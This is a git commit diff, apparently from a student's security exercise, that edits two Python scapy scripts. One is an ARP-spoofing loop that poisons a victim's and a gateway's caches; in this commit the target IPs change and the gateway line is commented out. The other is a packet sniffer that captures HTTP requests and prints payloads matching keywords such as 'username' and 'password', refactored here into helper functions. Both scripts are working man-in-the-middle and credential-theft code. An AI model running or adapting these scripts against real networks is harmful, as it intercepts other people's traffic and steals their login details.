6de341d1b181aabdb5e98dbc46d754499db807a6
vatojavier <antonioj.casado@estudiante.uam.es>
2019-03-21 18:10:43 +0100

    puesto en funciones to bonitas

--- arp_spoof.py
+++ arp_spoof.py
@@ -29,8 +29,8 @@ def reArp(victim_ip,victim_mac, gateway_ip,gateway_mac):
 
 
 ##      MAIN        ##
-victim_ip = "10.16.64.1"
-gtw_ip    = "10.16.68.171"
+victim_ip = "10.0.0.82"
+gtw_ip    = "10.0.0.1"
 
 victim_mac = get_mac(victim_ip)#get mac of victim
 gtw_mac    = get_mac(gtw_ip)#get mac of gtw
@@ -41,7 +41,7 @@ packets_count = 0
 try:
     while True:
         spoof_target(victim_ip,victim_mac,gtw_ip)
-        spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!? (only with home router WTF!)
+        #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!? (only with home router WTF!)
         packets_count = packets_count + 1
         print("\rPackets sent: " + str(packets_count), end="")
         time.sleep(2)
--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,18 +6,27 @@ from scapy.layers import http
 def sniff(interface):
      scapy.sniff(iface=interface, store=False, prn=process_packet, filter="tcp")
 
+def get_url(packet):
+     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        #printing interesting stuff
+        load = packet[scapy.Raw].load
+        keywords = ["username","uname","user","id","email","password","pass","code"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 #process the packet received by scapy.sniff called by prn
 def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         #printing url
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        url = get_url(packet)
         print("HTTP request ->> " + url)
-        if packet.haslayer(scapy.Raw):
-            #printing interesting stuff
-            load = packet[scapy.Raw].load
-            keywords = ["username","uname","user","id","email","password","pass","code"]
-            for keyword in keywords:
-                if keyword in load:
-                    print("Possible credentials ->> " + packet[scapy.Raw].load + "\n\n")
+        login_info = get_login_info(packet)
+        if login_info:
+            print("Possible credentials ->> " + login_info + "\n\n")
 
 sniff("wlp3s0")
